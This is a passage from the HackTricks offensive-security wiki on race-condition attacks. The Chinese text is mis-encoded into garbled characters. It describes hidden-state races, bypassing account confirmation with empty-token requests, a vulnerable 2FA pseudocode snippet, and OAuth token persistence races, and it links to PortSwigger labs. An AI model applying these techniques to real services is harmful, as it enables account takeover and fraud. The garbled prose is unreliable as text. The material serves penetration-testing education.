<li>å¤šæ¬¡å…‘æ¢ç¤¼å“å¡</li>
<li>å¤šæ¬¡è¯„ä»·äº§å“</li>
<li>æå–æˆ–è½¬ç§»è¶…è¿‡æ‚¨è´¦æˆ·ä½™é¢çš„ç°é‡‘</li>
<li>é‡å¤ä½¿ç”¨å•ä¸ª CAPTCHA è§£</li>
<li>ç»•è¿‡åæš´åŠ›ç ´è§£é€Ÿç‡é™åˆ¶</li>
</ul>
<h3 id="hidden-substates"><a class="header" href="#hidden-substates"><strong>Hidden substates</strong></a></h3>
<p>åˆ©ç”¨å¤æ‚çš„ç«äº‰æ¡ä»¶é€šå¸¸æ¶‰åŠåˆ©ç”¨ä¸éšè—æˆ–<strong>æ„å¤–æœºå™¨å­çŠ¶æ€</strong>äº¤äº’çš„çŸ­æš‚æœºä¼šã€‚ä»¥ä¸‹æ˜¯å¤„ç†æ­¤é—®é¢˜çš„æ–¹æ³•ï¼š</p>
<ol>
<li><strong>è¯†åˆ«æ½œåœ¨çš„éšè—å­çŠ¶æ€</strong></li>
</ol>
<ul>
<li>é¦–å…ˆç¡®å®šä¿®æ”¹æˆ–ä¸å…³é”®æ•°æ®äº¤äº’çš„ç«¯ç‚¹ï¼Œä¾‹å¦‚ç”¨æˆ·èµ„æ–™æˆ–å¯†ç é‡ç½®è¿‡ç¨‹ã€‚é‡ç‚¹å…³æ³¨ï¼š</li>
<li><strong>å­˜å‚¨</strong>ï¼šä¼˜å…ˆé€‰æ‹©æ“ä½œæœåŠ¡å™¨ç«¯æŒä¹…æ•°æ®çš„ç«¯ç‚¹ï¼Œè€Œä¸æ˜¯å¤„ç†å®¢æˆ·ç«¯æ•°æ®çš„ç«¯ç‚¹ã€‚</li>
<li><strong>æ“ä½œ</strong>ï¼šå¯»æ‰¾æ›´å¯èƒ½åˆ›å»ºå¯åˆ©ç”¨æ¡ä»¶çš„æ“ä½œï¼Œè¿™äº›æ“ä½œä¼šæ›´æ”¹ç°æœ‰æ•°æ®ï¼Œè€Œä¸æ˜¯æ·»åŠ æ–°æ•°æ®ã€‚</li>
<li><strong>é”®æ§</strong>ï¼šæˆåŠŸçš„æ”»å‡»é€šå¸¸æ¶‰åŠåŸºäºç›¸åŒæ ‡è¯†ç¬¦çš„æ“ä½œï¼Œä¾‹å¦‚ç”¨æˆ·åæˆ–é‡ç½®ä»¤ç‰Œã€‚</li>
</ul>
<ol start="2">
<li><strong>è¿›è¡Œåˆæ­¥æ¢æµ‹</strong></li>
</ol>
<ul>
<li>ä½¿ç”¨ç«äº‰æ¡ä»¶æ”»å‡»æµ‹è¯•è¯†åˆ«çš„ç«¯ç‚¹ï¼Œè§‚å¯Ÿæ˜¯å¦æœ‰ä»»ä½•åç¦»é¢„æœŸç»“æœçš„æƒ…å†µã€‚æ„å¤–çš„å“åº”æˆ–åº”ç”¨ç¨‹åºè¡Œä¸ºçš„å˜åŒ–å¯èƒ½è¡¨æ˜å­˜åœ¨æ¼æ´ã€‚</li>
</ul>
<ol start="3">
<li><strong>è¯æ˜æ¼æ´</strong></li>
</ol>
<ul>
<li>å°†æ”»å‡»ç¼©å°åˆ°åˆ©ç”¨æ¼æ´æ‰€éœ€çš„æœ€å°‘è¯·æ±‚æ•°é‡ï¼Œé€šå¸¸ä»…ä¸ºä¸¤ä¸ªã€‚ç”±äºæ¶‰åŠç²¾ç¡®çš„æ—¶æœºï¼Œè¿™ä¸€æ­¥å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æˆ–è‡ªåŠ¨åŒ–ã€‚</li>
</ul>
<h3 id="æ—¶é—´æ•æ„Ÿæ”»å‡»"><a class="header" href="#æ—¶é—´æ•æ„Ÿæ”»å‡»">æ—¶é—´æ•æ„Ÿæ”»å‡»</a></h3>
<p>è¯·æ±‚çš„æ—¶æœºç²¾ç¡®æ€§å¯ä»¥æ­ç¤ºæ¼æ´ï¼Œç‰¹åˆ«æ˜¯å½“ä½¿ç”¨å¯é¢„æµ‹çš„æ–¹æ³•ï¼ˆå¦‚æ—¶é—´æˆ³ï¼‰ä½œä¸ºå®‰å…¨ä»¤ç‰Œæ—¶ã€‚ä¾‹å¦‚ï¼ŒåŸºäºæ—¶é—´æˆ³ç”Ÿæˆå¯†ç é‡ç½®ä»¤ç‰Œå¯èƒ½å…è®¸åŒæ—¶è¯·æ±‚ç›¸åŒçš„ä»¤ç‰Œã€‚</p>
<p><strong>åˆ©ç”¨ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ç²¾ç¡®çš„æ—¶æœºï¼Œä¾‹å¦‚å•ä¸ªæ•°æ®åŒ…æ”»å‡»ï¼Œå‘èµ·å¹¶å‘çš„å¯†ç é‡ç½®è¯·æ±‚ã€‚ç›¸åŒçš„ä»¤ç‰Œè¡¨æ˜å­˜åœ¨æ¼æ´ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<ul>
<li>åŒæ—¶è¯·æ±‚ä¸¤ä¸ªå¯†ç é‡ç½®ä»¤ç‰Œå¹¶è¿›è¡Œæ¯”è¾ƒã€‚åŒ¹é…çš„ä»¤ç‰Œè¡¨æ˜ä»¤ç‰Œç”Ÿæˆå­˜åœ¨ç¼ºé™·ã€‚</li>
</ul>
<p><strong>æŸ¥çœ‹è¿™ä¸ª</strong> <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities"><strong>PortSwigger Lab</strong></a> <strong>æ¥å°è¯•è¿™ä¸ªã€‚</strong></p>
<h2 id="hidden-substates-case-studies"><a class="header" href="#hidden-substates-case-studies">Hidden substates case studies</a></h2>
<h3 id="pay--add-an-item"><a class="header" href="#pay--add-an-item">Pay &amp; add an Item</a></h3>
<p>æŸ¥çœ‹è¿™ä¸ª <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation"><strong>PortSwigger Lab</strong></a> ä»¥äº†è§£å¦‚ä½•åœ¨å•†åº—ä¸­<strong>æ”¯ä»˜</strong>å¹¶<strong>æ·»åŠ ä¸€ä¸ªé¢å¤–</strong>çš„æ‚¨<strong>ä¸éœ€è¦æ”¯ä»˜çš„</strong>ç‰©å“ã€‚</p>
<h3 id="confirm-other-emails"><a class="header" href="#confirm-other-emails">Confirm other emails</a></h3>
<p>è¿™ä¸ªæƒ³æ³•æ˜¯<strong>åŒæ—¶éªŒè¯ä¸€ä¸ªç”µå­é‚®ä»¶åœ°å€å¹¶å°†å…¶æ›´æ”¹ä¸ºå¦ä¸€ä¸ª</strong>ï¼Œä»¥æ‰¾å‡ºå¹³å°æ˜¯å¦éªŒè¯äº†æ›´æ”¹çš„æ–°åœ°å€ã€‚</p>
<h3 id="change-email-to-2-emails-addresses-cookie-based"><a class="header" href="#change-email-to-2-emails-addresses-cookie-based">Change email to 2 emails addresses Cookie based</a></h3>
<p>æ ¹æ®<a href="https://portswigger.net/research/smashing-the-state-machine"><strong>è¿™é¡¹ç ”ç©¶</strong></a>ï¼ŒGitlab é€šè¿‡è¿™ç§æ–¹å¼å®¹æ˜“å—åˆ°æ¥ç®¡ï¼Œå› ä¸ºå®ƒå¯èƒ½<strong>å°†ä¸€ä¸ªç”µå­é‚®ä»¶çš„</strong> <strong>ç”µå­é‚®ä»¶éªŒè¯ä»¤ç‰Œå‘é€åˆ°å¦ä¸€ä¸ªç”µå­é‚®ä»¶</strong>ã€‚</p>
<p><strong>æŸ¥çœ‹è¿™ä¸ª</strong> <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint"><strong>PortSwigger Lab</strong></a> <strong>æ¥å°è¯•è¿™ä¸ªã€‚</strong></p>
<h3 id="hidden-database-states--confirmation-bypass"><a class="header" href="#hidden-database-states--confirmation-bypass">Hidden Database states / Confirmation Bypass</a></h3>
<p>å¦‚æœä½¿ç”¨<strong>2ä¸ªä¸åŒçš„å†™å…¥</strong>æ¥<strong>æ·»åŠ </strong> <strong>ä¿¡æ¯</strong>åˆ°<strong>æ•°æ®åº“</strong>ä¸­ï¼Œåˆ™åœ¨<strong>ä»…å†™å…¥ç¬¬ä¸€æ¡æ•°æ®</strong>çš„çŸ­æ—¶é—´å†…å­˜åœ¨ä¸€ä¸ªå°çš„æ—¶é—´çª—å£ã€‚ä¾‹å¦‚ï¼Œåœ¨åˆ›å»ºç”¨æˆ·æ—¶ï¼Œ<strong>ç”¨æˆ·å</strong>å’Œ<strong>å¯†ç </strong>å¯èƒ½ä¼šè¢«<strong>å†™å…¥</strong>ï¼Œç„¶å<strong>ä»¤ç‰Œ</strong>ç”¨äºç¡®è®¤æ–°åˆ›å»ºçš„è´¦æˆ·è¢«å†™å…¥ã€‚è¿™æ„å‘³ç€åœ¨çŸ­æ—¶é—´å†…ï¼Œ<strong>ç¡®è®¤è´¦æˆ·çš„ä»¤ç‰Œæ˜¯ç©ºçš„</strong>ã€‚</p>
<p>å› æ­¤ï¼Œ<strong>æ³¨å†Œä¸€ä¸ªè´¦æˆ·å¹¶å‘é€å¤šä¸ªå¸¦æœ‰ç©ºä»¤ç‰Œçš„è¯·æ±‚</strong>ï¼ˆ<code>token=</code>æˆ–<code>token[]=</code>æˆ–ä»»ä½•å…¶ä»–å˜ä½“ï¼‰ä»¥ç«‹å³ç¡®è®¤è´¦æˆ·ï¼Œå¯èƒ½å…è®¸æ‚¨<strong>ç¡®è®¤ä¸€ä¸ªæ‚¨æ— æ³•æ§åˆ¶ç”µå­é‚®ä»¶çš„è´¦æˆ·</strong>ã€‚</p>
<p><strong>æŸ¥çœ‹è¿™ä¸ª</strong> <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction"><strong>PortSwigger Lab</strong></a> <strong>æ¥å°è¯•è¿™ä¸ªã€‚</strong></p>
<h3 id="bypass-2fa"><a class="header" href="#bypass-2fa">Bypass 2FA</a></h3>
<p>ä»¥ä¸‹ä¼ªä»£ç å®¹æ˜“å—åˆ°ç«äº‰æ¡ä»¶çš„å½±å“ï¼Œå› ä¸ºåœ¨åˆ›å»ºä¼šè¯çš„éå¸¸çŸ­çš„æ—¶é—´å†…ï¼Œ<strong>2FAæœªè¢«å¼ºåˆ¶æ‰§è¡Œ</strong>ï¼š</p>
<pre><code class="language-python">session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
</code></pre>
<h3 id="oauth2-æ°¸ä¹…æŒä¹…æ€§"><a class="header" href="#oauth2-æ°¸ä¹…æŒä¹…æ€§">OAuth2 æ°¸ä¹…æŒä¹…æ€§</a></h3>
<p>æœ‰å‡ ä¸ª <a href="https://en.wikipedia.org/wiki/List_of_OAuth_providers"><strong>OAUth æä¾›è€…</strong></a>ã€‚è¿™äº›æœåŠ¡å…è®¸æ‚¨åˆ›å»ºä¸€ä¸ªåº”ç”¨ç¨‹åºå¹¶éªŒè¯æä¾›è€…æ³¨å†Œçš„ç”¨æˆ·ã€‚ä¸ºæ­¤ï¼Œ<strong>å®¢æˆ·ç«¯</strong>éœ€è¦<strong>å…è®¸æ‚¨çš„åº”ç”¨ç¨‹åº</strong>è®¿é—®å…¶åœ¨<strong>OAUth æä¾›è€…</strong>ä¸­çš„æŸäº›æ•°æ®ã€‚<br />
åˆ°è¿™é‡Œä¸ºæ­¢ï¼Œåªæ˜¯ä¸€ä¸ªå¸¸è§çš„ä½¿ç”¨ google/linkedin/github ç­‰ç™»å½•çš„è¿‡ç¨‹ï¼Œæ‚¨ä¼šçœ‹åˆ°ä¸€ä¸ªé¡µé¢æç¤ºï¼šâ€œ<em>åº”ç”¨ç¨‹åº &lt;InsertCoolName&gt; æƒ³è¦è®¿é—®æ‚¨çš„ä¿¡æ¯ï¼Œæ‚¨æƒ³å…è®¸å—ï¼Ÿ</em>â€</p>
<h4 id="authorization_code-ä¸­çš„ç«äº‰æ¡ä»¶"><a class="header" href="#authorization_code-ä¸­çš„ç«äº‰æ¡ä»¶"><code>authorization_code</code> ä¸­çš„ç«äº‰æ¡ä»¶</a></h4>
<p><strong>é—®é¢˜</strong>å‡ºç°åœ¨æ‚¨<strong>æ¥å—</strong>åï¼Œè‡ªåŠ¨å°†**<code>authorization_code</code><strong>å‘é€ç»™æ¶æ„åº”ç”¨ç¨‹åºã€‚ç„¶åï¼Œè¿™ä¸ª</strong>åº”ç”¨ç¨‹åºåˆ©ç”¨ OAUth æœåŠ¡æä¾›è€…ä¸­çš„ç«äº‰æ¡ä»¶ï¼Œä»æ‚¨çš„è´¦æˆ·çš„**<code>authorization_code</code><strong>ç”Ÿæˆå¤šä¸ª AT/RT</strong>ï¼ˆ<em>èº«ä»½éªŒè¯ä»¤ç‰Œ/åˆ·æ–°ä»¤ç‰Œ</em>ï¼‰ã€‚åŸºæœ¬ä¸Šï¼Œå®ƒå°†åˆ©ç”¨æ‚¨å·²æ¥å—è¯¥åº”ç”¨ç¨‹åºè®¿é—®æ‚¨æ•°æ®çš„äº‹å®æ¥<strong>åˆ›å»ºå¤šä¸ªè´¦æˆ·</strong>ã€‚ç„¶åï¼Œå¦‚æœæ‚¨<strong>åœæ­¢å…è®¸è¯¥åº”ç”¨ç¨‹åºè®¿é—®æ‚¨çš„æ•°æ®ï¼Œä¸€å¯¹ AT/RT å°†è¢«åˆ é™¤ï¼Œä½†å…¶ä»–çš„ä»ç„¶æœ‰æ•ˆ</strong>ã€‚</p>
<h4 id="refresh-token-ä¸­çš„ç«äº‰æ¡ä»¶"><a class="header" href="#refresh-token-ä¸­çš„ç«äº‰æ¡ä»¶"><code>Refresh Token</code> ä¸­çš„ç«äº‰æ¡ä»¶</a></h4>
<p>ä¸€æ—¦æ‚¨<strong>è·å¾—æœ‰æ•ˆçš„ RT</strong>ï¼Œæ‚¨å¯ä»¥å°è¯•<strong>åˆ©ç”¨å®ƒç”Ÿæˆå¤šä¸ª AT/RT</strong>ï¼Œå³ä½¿ç”¨æˆ·å–æ¶ˆäº†æ¶æ„åº”ç”¨ç¨‹åºè®¿é—®å…¶æ•°æ®çš„æƒé™ï¼Œ<strong>å¤šä¸ª RT ä»ç„¶æœ‰æ•ˆã€‚</strong></p>
<h2 id="websockets-ä¸­çš„-rc"><a class="header" href="#websockets-ä¸­çš„-rc"><strong>WebSockets ä¸­çš„ RC</strong></a></h2>
<p>åœ¨ <a href="https://github.com/redrays-io/WS_RaceCondition_PoC"><strong>WS_RaceCondition_PoC</strong></a> ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç”¨ Java ç¼–å†™çš„ PoCï¼Œä»¥<strong>å¹¶è¡Œ</strong>å‘é€ websocket æ¶ˆæ¯ï¼Œåˆ©ç”¨<strong>Web Sockets ä¸­çš„ç«äº‰æ¡ä»¶</strong>ã€‚</p>
<h2 id="å‚è€ƒæ–‡çŒ®"><a class="header" href="#å‚è€ƒæ–‡çŒ®">å‚è€ƒæ–‡çŒ®</a></h2>
<ul>
<li><a href="https://hackerone.com/reports/759247">https://hackerone.com/reports/759247</a></li>
<li><a href="https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html">https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html</a></li>
<li><a href="https://hackerone.com/reports/55140">https://hackerone.com/reports/55140</a></li>
<li><a href="https://portswigger.net/research/smashing-the-state-machine">https://portswigger.net/research/smashing-the-state-machine</a></li>
<li><a href="https://portswigger.net/web-security/race-conditions">https://portswigger.net/web-security/race-conditions</a></li>
<li><a href="https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/">https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/</a></li>
</ul>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
<p><br />
ä½¿ç”¨ <a href="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=text&amp;utm_campaign=ppc&amp;utm_term=trickest&amp;utm_content=race-condition"><strong>Trickest</strong></a> è½»æ¾æ„å»ºå’Œ<strong>è‡ªåŠ¨åŒ–å·¥ä½œæµ</strong>ï¼Œç”±ä¸–ç•Œä¸Š<strong>æœ€å…ˆè¿›</strong>çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚<br />
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š</p>
<p>{% embed url="https://trickest.com/?utm_source=hacktricks&amp;utm_medium=banner&amp;utm_campaign=ppc&amp;utm_content=race-condition" %}</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/proxy-waf-protections-bypass.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/rate-limit-bypass.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/proxy-waf-protections-bypass.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/rate-limit-bypass.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
